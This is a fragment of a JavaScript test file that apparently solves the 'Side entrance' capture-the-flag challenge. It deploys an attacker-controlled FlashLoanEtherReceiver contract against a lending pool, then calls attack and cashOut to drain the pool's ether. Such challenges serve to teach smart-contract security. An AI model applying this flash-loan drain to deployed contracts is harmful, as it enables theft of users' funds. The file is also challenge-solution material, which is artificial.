...
describe('[Challenge] Side entrance', function () {
    ...
    it('Exploit', async function () {
        ...
        const FlashLoanEtherRecieverFactory = await ethers.getContractFactory("FlashLoanEtherReceiver", attacker);
        this.reciever = await FlashLoanEtherRecieverFactory.deploy(this.pool.address);

        this.reciever.connect(attacker).attack(ETHER_IN_POOL);
        this.reciever.cashOut();
    });
